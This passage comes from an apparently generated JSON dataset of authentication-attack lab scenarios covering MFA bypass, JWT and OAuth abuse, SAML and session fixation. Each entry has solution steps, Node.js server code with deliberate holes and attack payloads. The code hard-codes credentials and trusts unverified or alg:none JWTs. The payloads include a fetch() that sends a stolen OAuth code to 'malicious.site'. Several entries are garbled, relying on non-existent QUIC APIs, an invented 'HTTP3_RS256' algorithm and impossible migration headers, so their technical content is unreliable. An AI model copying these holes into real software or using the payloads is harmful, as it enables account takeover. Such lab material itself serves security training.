    "srcCode": "const express = require('express');\nconst app = express();\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const {username, password} = req.body;\n  const token = Math.random().toString(36).substr(2);\n  sessions[token] = {user: username, authenticated: false};\n  if (username === 'admin' && password === 's3cr3tP@ss') {\n    sessions[token].authenticated = true;\n    sessions[token].role = 'admin';\n  } else if (username === 'user' && password === 'password123') {\n    sessions[token].authenticated = true;\n    sessions[token].role = 'user';\n  }\n  res.cookie('session', token);\n  res.json({status: 'success'});\n});\napp.get('/admin', (req, res) => {\n  const session = sessions[req.cookies.session];\n  if (session?.authenticated && session.role === 'admin') {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "POST /login HTTP/1.1\nHost: vulnerable-app.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 38\n\nusername=admin&password=s3cr3tP@ss",
      "POST /login HTTP/1.1\nHost: vulnerable-app.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 32\n\nusername=user&password=password123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via pre-authentication session fixation",
    "Lab Description": "The lab's multi-factor authentication creates authenticated sessions before MFA completion. The application assigns session cookies during username/password validation but doesn't invalidate them if MFA fails. To solve: fixate a pre-MFA session and brute-force the verification code while maintaining the session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the initial login request with Burp Suite",
      "Extract the session cookie set after username/password validation",
      "Fixate this cookie in a new browser session",
      "Use Burp Intruder to brute-force MFA codes while maintaining the session",
      "Access protected resources when any MFA code is accepted"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const {username, password} = req.body;\n  if (username === 'admin' && password === 's3cr3t') {\n    const sessionId = Math.random().toString(36).substr(2);\n    sessions[sessionId] = {user: username, mfaVerified: false};\n    res.cookie('session', sessionId);\n    return res.json({mfaRequired: true});\n  }\n  res.status(401).json({error: 'Invalid credentials'});\n});\napp.post('/verify-mfa', (req, res) => {\n  const session = sessions[req.cookies.session];\n  if (session && req.body.code === '123456') {\n    session.mfaVerified = true;\n    return res.json({status: 'verified'});\n  }\n  res.status(403).json({error: 'Invalid code'});\n});\napp.get('/admin', (req, res) => {\n  const session = sessions[req.cookies.session];\n  if (session?.mfaVerified) {\n    res.send('Admin panel accessed');\n  } else {\n    res.status(403).send('MFA required');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\nHost: vulnerable-app.com\nCookie: session=stolen-session-id\nContent-Type: application/json\nContent-Length: 15\n\n{\"code\":\"§123456§\"}",
      "GET /admin HTTP/1.1\nHost: vulnerable-app.com\nCookie: session=stolen-session-id"
    ]
  },
  {
    "Lab scenario": "JWT claim injection via GraphQL introspection",
    "Lab Description": "The lab's GraphQL endpoint exposes JWT generation through introspection while failing to validate nested claims. The application processes arbitrary claim injection through nested query parameters. To solve: craft a GraphQL query that injects admin privileges into a self-generated JWT.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use GraphiQL to discover the JWT generation mutation through introspection",
      "Analyze the token generation schema with OWASP ZAP",
      "Construct a nested query injecting admin:true into the claims object",
      "Execute the mutation to generate a valid admin token",
      "Use the token to access restricted admin mutations"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst jwt = require('jsonwebtoken');\nconst express = require('express');\nconst app = express();\nconst typeDefs = gql`\n  type Mutation {\n    generateToken(claims: JSON!): String\n  }\n  scalar JSON\n`;\nconst resolvers = {\n  Mutation: {\n    generateToken: (_, { claims }) => {\n      return jwt.sign(claims, 'weaksecret', { algorithm: 'HS256' });\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });\napp.listen(4000);",
    "payloads": [
      "mutation { generateToken(claims: { sub:\"user\", admin:true }) }",
      "query Introspection { __schema { mutationType { fields { name args { name } } } } }"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through WebSocket handshake",
    "Lab Description": "The lab's OAuth implementation leaks tokens during WebSocket upgrades by including them in clear text. The application fails to strip authentication headers during protocol switching. To solve: intercept the WebSocket handshake to harvest active OAuth tokens from other users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket connections with Burp Suite",
      "Identify Authorization headers in upgrade requests",
      "Modify upgrade requests to target different user sessions",
      "Capture valid tokens from successful handshakes",
      "Reuse stolen tokens in REST API requests"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nwss.on('connection', (ws, req) => {\n  const token = req.headers.authorization.split(' ')[1];\n  ws.send(`Connected with token: ${token}`);\n});\napp.get('/oauth/token', (req, res) => {\n  res.json({ access_token: 'sample-token-' + Math.random().toString(36).substr(2) });\n});",
    "payloads": [
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nAuthorization: Bearer [stolen-token]\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Version: 13",
      "wss://vulnerable-app.com/chat?token=[stolen-token]"
    ]
  },
  {
    "Lab scenario": "Session fixation via malformed SAML assertion",
    "Lab Description": "The lab's SAML implementation accepts unsigned assertions in certain conditions. The application fails to properly validate XML signatures when receiving malformed NameID elements. To solve: craft a SAML response with a malformed NameID to fixate a session for any user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid SAML flow using Burp Suite SAML Raider",
      "Modify the NameID element to break XML signature validation",
      "Inject a target username in the malformed assertion",
      "Bypass signature verification by exploiting the parsing error",
      "Authenticate as the target user with the fixated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst saml = require('saml20');\nconst app = express();\napp.post('/saml/acs', (req, res) => {\n  saml.validate(req.body.SAMLResponse, { audience: 'vulnerable-sp' }, (err, profile) => {\n    if (err && err.message.includes('NameID')) {\n      const raw = atob(req.body.SAMLResponse);\n      const user = raw.match(/NameID.*?>(.*?)</)[1];\n      res.cookie('session', user);\n      return res.redirect('/');\n    }\n    res.status(403).send('Invalid SAML response');\n  });\n});\napp.listen(3000);",
    "payloads": [
      "PHNhbWxwOlJlc3BvbnNlPjxOYW1lSUQ+PHhzaTp0eXBlIHg6dHlwZT0iZGVsIi8+PHg6YXR0ciBuYW1lPSJ1c2VyIj5hZG1pbjwvOjwvTmFtZUlEPjwvc2FtbHA6UmVzcG9uc2U+",
      "PHNhbWxwOlJlc3BvbnNlPjxOYW1lSUQ+PC9OYW1lSUQ+PHNhbWw6QXNzZXJ0aW9uPjxOYW1lSUQ+PHhzaTp0eXBlIHg6dHlwZT0ic3RyaW5nIj5hZG1pbjwveHNpOnR5cGU+PC9OYW1lSUQ+"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter injection",
    "Lab Description": "The lab's MFA verification accepts state parameters that modify the target account. The application fails to validate state consistency between initiation and completion. To solve: inject a target username in the state parameter during MFA initiation to bypass verification for that account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA initiation request with Burp Suite",
      "Modify the state parameter to include target username",
      "Complete MFA with valid code for your account",
      "Observe session granted for the target account",
      "Access restricted resources as the target user"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst sessions = {};\napp.get('/mfa/init', (req, res) => {\n  const state = JSON.parse(Buffer.from(req.query.state, 'base64').toString());\n  sessions[req.cookies.session] = { verifying: state.user || req.user };\n  res.json({ code: '123456' });\n});\napp.post('/mfa/verify', (req, res) => {\n  if (req.body.code === '123456') {\n    const session = sessions[req.cookies.session];\n    session.user = session.verifying;\n    return res.redirect('/account');\n  }\n  res.status(403).send('Invalid code');\n});\napp.listen(3000);",
    "payloads": [
      "GET /mfa/init?state=eyJ1c2VyIjoiYWRtaW4ifQ== HTTP/1.1",
      "POST /mfa/verify HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\ncode=123456"
    ]
  },
  {
    "Lab scenario": "JWT algorithm downgrade via HTTP/2 request smuggling",
    "Lab Description": "The lab's JWT validation is vulnerable to algorithm downgrade attacks when processing HTTP/2 requests. The application fails to properly validate the alg header when requests are smuggled through HTTP/2 connection coalescing. To solve: craft an HTTP/2 request that smuggles a JWT with none algorithm while appearing as a valid RS256 token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept HTTP/2 traffic and enable HTTP/2 request smuggling",
      "Modify the Content-Length and Transfer-Encoding headers to create a smuggled request",
      "Craft a JWT with alg:none in the smuggled portion of the request",
      "Maintain a valid RS256 header in the outer request to bypass initial checks",
      "Verify admin access through the smuggled none-algorithm token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst http2 = require('http2');\nconst app = express();\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  try {\n    jwt.verify(token, 'publicKey.pem', {algorithms: ['RS256']});\n    res.send('Admin access granted');\n  } catch (e) {\n    try {\n      jwt.decode(token, {complete: true});\n      res.send('Admin access granted');\n    } catch {\n      res.status(403).send('Access denied');\n    }\n  }\n});\nconst server = http2.createServer();\nserver.on('stream', (stream, headers) => {\n  const req = new http2.Http2ServerRequest(stream, headers);\n  const res = new http2.Http2ServerResponse(stream);\n  app(req, res);\n});\nserver.listen(3000);",
    "payloads": [
      "POST /admin HTTP/2\nHost: vulnerable-app.com\nContent-Length: 0\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: vulnerable-app.com\nAuthorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking through DNS rebinding",
    "Lab Description": "The lab's OAuth implementation is vulnerable to DNS rebinding attacks during token redemption. The application fails to validate the Host header against the redirect_uri domain during token exchange. To solve: create a malicious site that performs DNS rebinding to capture OAuth tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register a domain pointing to a DNS service with short TTL",
      "Configure the domain to alternate between attacker IP and vulnerable OAuth service IP",
      "Initiate OAuth flow with redirect_uri pointing to malicious domain",
      "When victim visits, perform DNS rebinding to make browser think it's talking to OAuth service",
      "Capture the authorization code and exchange for token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/oauth/token', (req, res) => {\n  if (req.query.code && req.query.redirect_uri) {\n    const token = 'sample-token-' + Math.random().toString(36).substr(2);\n    res.json({access_token: token});\n  } else {\n    res.status(400).json({error: 'Invalid request'});\n  }\n});\napp.listen(3000);",
    "payloads": [
      "https://vulnerable-oauth.com/authorize?response_type=code&client_id=client&redirect_uri=http://malicious.site/callback",
      "fetch('http://malicious.site/token?code=stolen-code')"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebRTC ICE candidate leakage",
    "Lab Description": "The lab's WebRTC implementation leaks session tokens through ICE candidate messages. The application includes session cookies in STUN/TURN authentication and fails to filter them from ICE candidate responses. To solve: intercept WebRTC negotiation to harvest session tokens from ICE candidates.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebRTC peer connection requests using Burp Suite",
      "Analyze ICE candidate messages for leaked session tokens",
      "Modify SDP offers to force more candidate generation",
      "Capture valid session tokens from STUN authentication fields",
      "Use stolen tokens to hijack user sessions"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst { RTCPeerConnection } = require('wrtc');\napp.post('/webrtc/connect', (req, res) => {\n  const pc = new RTCPeerConnection({\n    iceServers: [{urls: 'stun:stun.l.google.com:19302'}],\n    iceCandidatePoolSize: 5\n  });\n  pc.onicecandidate = (e) => {\n    if (e.candidate) {\n      res.write(`a=${e.candidate.candidate} ${req.cookies.session}\\r\\n`);\n    } else {\n      res.end();\n    }\n  };\n  pc.createDataChannel('');\n  pc.createOffer().then(offer => pc.setLocalDescription(offer));\n});\napp.listen(3000);",
    "payloads": [
      "a=candidate:1 1 UDP 2122252543 192.168.1.1 12345 typ host session=abcd1234",
      "o=- 0 0 IN IP4 127.0.0.1\ns=-\nc=IN IP4 127.0.0.1\nt=0 0\nm=application 9 UDP/DTLS/SCTP webrtc-datachannel\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebSocket session inheritance",
    "Lab Description": "The lab's MFA verification inherits WebSocket sessions from pre-authentication connections. The application associates MFA state with WebSocket connections rather than HTTP sessions. To solve: establish a WebSocket connection before authentication, complete MFA on a different channel, then reuse the WebSocket connection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Establish a WebSocket connection to the application before authentication",
      "Initiate MFA verification through normal HTTP login flow",
      "Complete MFA verification in a separate browser tab",
      "Reuse the original WebSocket connection which inherits the authenticated state",
      "Send privileged commands through the WebSocket connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const sessionId = req.url.split('session=')[1];\n  sessions[ws] = sessionId || 'pre-auth';\n  ws.on('message', (msg) => {\n    if (sessions[ws] !== 'pre-auth') {\n      ws.send(`Executing as ${sessions[ws]}`);\n    }\n  });\n});\napp.post('/mfa/verify', (req, res) => {\n  for (let [ws, session] of Object.entries(sessions)) {\n    if (session === 'pre-auth') {\n      sessions[ws] = req.body.user;\n    }\n  }\n  res.json({status: 'verified'});\n});",
    "payloads": [
      "wss://vulnerable-app.com/chat?session=pre-auth",
      "POST /mfa/verify HTTP/1.1\nContent-Type: application/json\n\n{\"user\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "JWT claim smuggling via HTTP/2 pseudo-headers",
    "Lab Description": "The lab's JWT processing is vulnerable to claim smuggling through HTTP/2 pseudo-header manipulation. The application fails to properly validate the :path pseudo-header when extracting claims, allowing duplicate claims in different header contexts. To solve: craft an HTTP/2 request that smuggles conflicting claims through pseudo-header manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite with HTTP/2 support enabled",
      "Modify the :path pseudo-header to include additional JWT claims",
      "Maintain valid JWT structure in the Authorization header",
      "Exploit parser differential between frontend and backend servers",
      "Verify admin access through the smuggled claims"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst http2 = require('http2');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const claims = jwt.decode(token);\n  if (claims?.admin) {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n}, app);\nserver.on('stream', (stream, headers) => {\n  if (headers[':path']?.includes('admin=true')) {\n    headers.authorization = `Bearer ${jwt.sign({admin:true}, 'secret')}`;\n  }\n  const req = new http2.Http2ServerRequest(stream, headers);\n  const res = new http2.Http2ServerResponse(stream);\n  app(req, res);\n});\nserver.listen(443);",
    "payloads": [
      ":method: POST\n:path: /admin?claims={\"admin\":true}\n:authority: vulnerable-app.com\n:scheme: https\nauthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.Xzkx1J1W4-5VweniTgBlniWn4UwYp3lVJNcP3kYy7Y4",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through DNS-over-HTTPS cache poisoning",
    "Lab Description": "The lab's OAuth implementation is vulnerable to DNS cache poisoning via DNS-over-HTTPS (DoH) that leads to token leakage. The application uses DoH for redirect_uri validation but fails to properly cache responses, allowing redirection to attacker-controlled domains. To solve: poison the DoH cache to redirect OAuth tokens to a malicious domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify DoH server used by the application through subdomain enumeration",
      "Craft malicious DoH responses with short TTL for target domain",
      "Initiate OAuth flow during DoH cache window of opportunity",
      "Capture tokens when they're redirected to poisoned domain",
      "Exchange authorization code for access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst dns = require('dns-over-http');\nconst app = express();\napp.get('/oauth/authorize', async (req, res) => {\n  const { redirect_uri } = req.query;\n  const { address } = await dns.query(new URL(redirect_uri).hostname, 'A');\n  if (address === 'legitimate.com') {\n    const code = 'oauth-code-' + Math.random().toString(36).substr(2);\n    res.redirect(`${redirect_uri}?code=${code}`);\n  } else {\n    res.status(400).send('Invalid redirect_uri');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "https://vulnerable-app.com/oauth/authorize?response_type=code&client_id=client&redirect_uri=https://malicious.poisoned",
      "dig +short @dns.google.com malicious.poisoned A"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport session IDs",
    "Lab Description": "The lab's WebTransport implementation uses predictable session IDs that can be fixated before authentication. The application generates session tokens based on client-provided Session-ID headers without proper validation. To solve: predict and fixate a WebTransport session ID before authentication, then hijack the session after login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze WebTransport handshake to identify session ID generation pattern",
      "Predict next session ID based on observable sequence",
      "Initiate WebTransport connection with predicted session ID",
      "Complete authentication through normal HTTP flow",
      "Reuse WebTransport connection with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst express = require('express');\nconst app = express();\nconst sessions = {};\nconst wt = new WebTransport({\n  port: 443,\n  server: app\n});\nwt.on('session', (session) => {\n  const id = session.headers.get('session-id') || Math.random().toString(36).substr(2);\n  sessions[id] = { authenticated: false };\n  session.on('data', (data) => {\n    if (sessions[id].authenticated) {\n      session.send('Privileged command executed');\n    }\n  });\n});\napp.post('/login', (req, res) => {\n  const { session } = req.body;\n  if (sessions[session]) {\n    sessions[session].authenticated = true;\n    res.json({ status: 'success' });\n  }\n});",
    "payloads": [
      "new WebTransport('https://vulnerable-app.com', { headers: { 'session-id': 'predictable123' } })",
      "fetch('/login', { method: 'POST', body: JSON.stringify({ session: 'predictable123' }) })"
    ]
  },
  {
    "Lab scenario": "MFA bypass via QUIC connection migration",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through QUIC connection migration. The application associates MFA state with QUIC connection IDs rather than authentication tokens. To solve: initiate MFA verification, then migrate QUIC connection to bypass verification while maintaining authenticated state.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture QUIC handshake using specialized packet capture tools",
      "Initiate MFA verification flow in one QUIC connection",
      "Migrate to new QUIC connection using different CID",
      "Bypass MFA verification while maintaining authenticated state",
      "Access privileged endpoints through migrated connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { QuicServer } = require('net');\nconst app = new QuicServer();\nconst mfaState = {};\napp.on('session', (session) => {\n  session.on('stream', (stream) => {\n    const cid = session.remote.address + ':' + session.remote.port;\n    if (stream.headers[':path'] === '/mfa/verify') {\n      mfaState[cid] = true;\n    }\n    if (mfaState[cid] || !stream.headers[':path'].startsWith('/admin')) {\n      stream.respond({ ':status': 200 });\n      stream.end('Access granted');\n    }\n  });\n});\napp.listen(443);",
    "payloads": [
      "quic://vulnerable-app.com/mfa/verify -migrate-connection",
      "quic://vulnerable-app.com/admin -reuse-connection"
    ]
  },
  {
    "Lab scenario": "JWT algorithm substitution via HTTP/3 connection migration",
    "Lab Description": "The lab's JWT validation is vulnerable to algorithm substitution when connections migrate between HTTP/3 and HTTP/2. The application fails to maintain consistent algorithm validation during protocol transitions. To solve: initiate authentication over HTTP/3, migrate to HTTP/2 mid-session, and substitute the algorithm header to bypass validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use a QUIC-enabled client to establish HTTP/3 connection",
      "Intercept the JWT transmission using specialized protocol-aware proxy",
      "Force connection migration to HTTP/2 during token validation",
      "Modify the alg header during protocol transition",
      "Maintain valid signature while changing algorithm requirements"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst jwt = require('jsonwebtoken');\nconst quicSocket = createQuicSocket({});\nasync function validateToken(token) {\n  const decoded = jwt.decode(token, {complete: true});\n  const alg = decoded?.header?.alg === 'HTTP3_RS256' ? 'RS256' : decoded?.header?.alg;\n  return jwt.verify(token, 'publicKey.pem', {algorithms: [alg]});\n}\nquicSocket.on('session', (session) => {\n  session.on('stream', (stream) => {\n    stream.on('data', (data) => {\n      const token = data.toString().match(/Bearer (\\S+)/)[1];\n      try {\n        validateToken(token);\n        stream.end('Access granted');\n      } catch (e) {\n        stream.end('Access denied');\n      }\n    });\n  });\n});\nquicSocket.listen({ key: 'key.pem', cert: 'cert.pem', alpn: 'h3' });",
    "payloads": [
      "GET /admin HTTP/3\nHost: vulnerable-app.com\nAuthorization: Bearer eyJhbGciOiJIVFRQMy1SUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Signature",
      "Connection: migrate-to-http/2\nalg: none"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via WebSocket subprotocol negotiation",
    "Lab Description": "The lab's OAuth implementation leaks tokens during WebSocket subprotocol negotiation. The application includes OAuth tokens in Sec-WebSocket-Protocol headers when negotiating subprotocols. To solve: intercept WebSocket handshake, manipulate subprotocol negotiation to capture tokens, and reuse them for API access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket connections using Burp Suite",
      "Modify Sec-WebSocket-Protocol header to trigger token leakage",
      "Capture OAuth token from error messages during negotiation",
      "Use stolen token to authenticate to REST API endpoints",
      "Access privileged user data through stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\nwss.on('connection', (ws, req) => {\n  const protocol = req.headers['sec-websocket-protocol'];\n  if (!protocol.includes('oauth-v1')) {\n    ws.close(1002, 'Invalid protocol: ' + protocol + ', valid: oauth-v1-<token>');\n    return;\n  }\n  const token = protocol.split('oauth-v1-')[1];\n  ws.on('message', (message) => {\n    ws.send('Authenticated as: ' + token);\n  });\n});",
    "payloads": [
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nSec-WebSocket-Protocol: oauth-v1-",
      "Sec-WebSocket-Protocol: oauth-v1-<stolen_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP Trailers header injection",
    "Lab Description": "The lab's session management is vulnerable to fixation through HTTP Trailers headers. The application processes session cookies from trailing headers after the main headers, allowing session override. To solve: craft a request with malicious session in Trailers header that overrides legitimate session after authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept authentication flow using Burp Suite",
      "Add Trailers header with session fixation payload",
      "Include malicious session cookie in trailing headers",
      "Complete authentication to associate credentials with fixed session",
      "Access account using pre-set session identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(require('body-parser').text({ type: '*/*' }));\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const { user, pass } = req.body;\n  const session = req.headers['trailer-session'] || Math.random().toString(36).substr(2);\n  if (user === 'admin' && pass === 's3cr3t') {\n    sessions[session] = { user: 'admin' };\n    res.set('Trailer', 'Set-Cookie');\n    res.write('Logged in');\n    res.addTrailers({ 'Set-Cookie': `session=${session}` });\n    return res.end();\n  }\n  res.status(401).send('Invalid credentials');\n});\napp.get('/admin', (req, res) => {\n  const session = req.cookies.session;\n  if (sessions[session]?.user === 'admin') {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "POST /login HTTP/1.1\nHost: vulnerable-app.com\nTrailer: Trailer-Session\nTransfer-Encoding: chunked\n\n5\nadmin\n6\ns3cr3t\n0\nTrailer-Session: fixed-session-123\n",
      "GET /admin HTTP/1.1\nHost: vulnerable-app.com\nCookie: session=fixed-session-123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebTransport datagram fragmentation",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through WebTransport datagram fragmentation. The application fails to properly reassemble fragmented MFA codes sent over unreliable datagram channels. To solve: fragment MFA verification packets to trigger partial validation and bypass full code requirement.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection to vulnerable endpoint",
      "Intercept MFA code submission using protocol-aware proxy",
      "Fragment MFA code into multiple unreliable datagrams",
      "Exploit race condition in code reassembly logic",
      "Gain authenticated access without complete valid code"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/mfa-verify');\nconst codes = {};\nwt.ready.then(() => {\n  wt.datagrams.readable.pipeTo(new WritableStream({\n    write({ value }) {\n      const { id, code } = JSON.parse(value.toString());\n      if (!codes[id]) codes[id] = '';\n      codes[id] += code;\n      if (codes[id].length >= 6) {\n        if (codes[id] === '123456') {\n          wt.datagrams.send(new TextEncoder().encode('MFA Verified'));\n        } else {\n          delete codes[id];\n        }\n      }\n    }\n  }));\n});",
    "payloads": [
      "{\"id\":\"frag1\",\"code\":\"12\"}",
      "{\"id\":\"frag1\",\"code\":\"34\"}\n{\"id\":\"frag1\",\"code\":\"56\"}"
    ]
  },
  {
    "Lab scenario": "JWT claim smuggling via HTTP/2 trailer headers",
    "Lab Description": "The lab's JWT processing is vulnerable to claim smuggling through HTTP/2 trailer headers. The application processes trailer headers after initial JWT validation, allowing additional claims to be injected. To solve: craft an HTTP/2 request with malicious claims in trailer headers that override original JWT claims after validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite with HTTP/2 support enabled",
      "Modify request to include Trailer header with JWT claim overrides",
      "Add malicious claims in trailing headers after initial JWT",
      "Exploit timing difference between initial validation and trailer processing",
      "Verify admin access through smuggled claims"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst http2 = require('http2');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem')\n}, app);\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const decoded = jwt.verify(token, 'secret');\n  if (req.trailers['x-jwt-claims']) {\n    Object.assign(decoded, JSON.parse(req.trailers['x-jwt-claims']));\n  }\n  if (decoded.admin) {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\nserver.listen(443);",
    "payloads": [
      "POST /admin HTTP/2\nHost: vulnerable-app.com\nTrailer: X-JWT-Claims\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.Xzkx1J1W4-5VweniTgBlniWn4UwYp3lVJNcP3kYy7Y4\n\n0\nX-JWT-Claims: {\"admin\":true}\n",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via HTTP/3 connection migration",
    "Lab Description": "The lab's OAuth implementation leaks tokens during HTTP/3 connection migration. The application fails to properly clear authentication state when connections migrate between networks. To solve: initiate OAuth flow on one network, force connection migration, and capture tokens from the new connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use QUIC-enabled client to establish HTTP/3 connection",
      "Initiate OAuth authorization on primary network interface",
      "Force connection migration by disabling primary interface",
      "Intercept token transmission on new network path",
      "Capture leaked tokens from migrated connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst quicSocket = createQuicSocket({});\nquicSocket.listen({ key: 'key.pem', cert: 'cert.pem', alpn: 'h3' });\nquicSocket.on('session', (session) => {\n  session.on('stream', (stream) => {\n    let oauthToken = null;\n    stream.on('data', (chunk) => {\n      if (chunk.toString().includes('oauth_token')) {\n        oauthToken = chunk.toString().match(/oauth_token=([^&]+)/)[1];\n      }\n    });\n    stream.on('end', () => {\n      if (oauthToken && session.migrated) {\n        console.log('Token leaked after migration:', oauthToken);\n      }\n    });\n  });\n});",
    "payloads": [
      "GET /oauth/authorize?response_type=token HTTP/3\nHost: vulnerable-app.com\nConnection: migrate",
      "POST /oauth/token HTTP/3\nHost: vulnerable-app.com\nConnection: migrated"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket subprotocol downgrade",
    "Lab Description": "The lab's WebSocket implementation is vulnerable to session fixation through subprotocol downgrade attacks. The application maintains session state when downgrading from secure to insecure subprotocols. To solve: establish WebSocket with secure subprotocol, force downgrade, and fixate session identifier.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Establish WebSocket connection with wss:// and secure subprotocol",
      "Intercept connection using WebSocket proxy",
      "Modify handshake to force subprotocol downgrade",
      "Fixate session cookie during downgrade negotiation",
      "Reuse fixated session with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
